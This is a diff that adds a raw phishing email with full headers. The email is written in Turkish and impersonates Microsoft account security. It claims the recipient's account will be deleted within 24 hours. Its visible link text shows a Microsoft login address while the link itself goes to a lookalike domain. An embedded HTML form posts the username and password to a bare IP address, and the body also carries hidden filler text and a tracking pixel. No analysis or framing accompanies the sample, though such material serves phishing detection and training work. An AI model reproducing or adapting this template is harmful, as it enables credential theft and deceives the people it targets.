@@ -1,0 +1,39 @@
+Return-Path: <bounce@mail-relay-77.top>
+Received: from mail-relay-77.top (unknown [193.176.79.204])
+	by mx.sirket.com.tr with ESMTP id 4Rk2p1
+	for <ahmet.yilmaz@sirket.com.tr>; Tue, 28 Jul 2026 02:41:12 +0300
+Received: from localhost (localhost [127.0.0.1])
+	by mail-relay-77.top (Postfix) with ESMTP id 9F2A11C0
+	for <ahmet.yilmaz@sirket.com.tr>; Tue, 28 Jul 2026 02:41:10 +0300
+Authentication-Results: mx.sirket.com.tr;
+	spf=fail (sender IP is 193.176.79.204) smtp.mailfrom=mail-relay-77.top;
+	dkim=none header.d=none; dmarc=fail action=quarantine header.from=microsoft.com
+From: "Microsoft Hesap Guvenligi" <security-noreply2026@gmail.com>
+Reply-To: <destek@microsoft-hesap-dogrulama.top>
+To: ahmet.yilmaz@sirket.com.tr
+Subject: ACIL: Hesabiniz 24 saat icinde askiya alinacak
+Date: Tue, 28 Jul 2026 02:41:08 +0300
+Message-ID: <20260728024108.9F2A11C0@mail-relay-77.top>
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+X-Mailer: PHPMailer 5.2.9
+
+<html><body style="font-family:Arial">
+<p>Sayin Musteri,</p>
+<p><b>Hesabinizda olagan disi giris aktivitesi tespit edildi.</b>
+Guvenliginiz icin hesabiniz gecici olarak kisitlanmistir.
+Lutfen <b>24 saat icinde</b> kimliginizi dogrulayin, aksi halde hesabiniz
+kalici olarak silinecektir.</p>
+<p><a href="http://microsoft-hesap-dogrulama.top/login/verify?id=8812&amp;u=ahmet.yilmaz">
+https://login.microsoftonline.com/verify</a></p>
+<p>Alternatif baglanti: <a href="https://bit.ly/3xQzVn1">buraya tiklayin</a></p>
+<form action="http://193.176.79.204/collect.php" method="post">
+  Kullanici adi: <input name="user"><br>
+  Sifre: <input name="password" type="password"><br>
+  <input type="submit" value="Dogrula">
+</form>
+<span style="display:none">unsubscribe token 8812 mailing list footer legal</span>
+<img src="http://microsoft-hesap-dogrulama.top/px.gif?id=8812" width="1" height="1">
+<p style="color:#888;font-size:11px">Microsoft Corporation</p>
+</body></html>
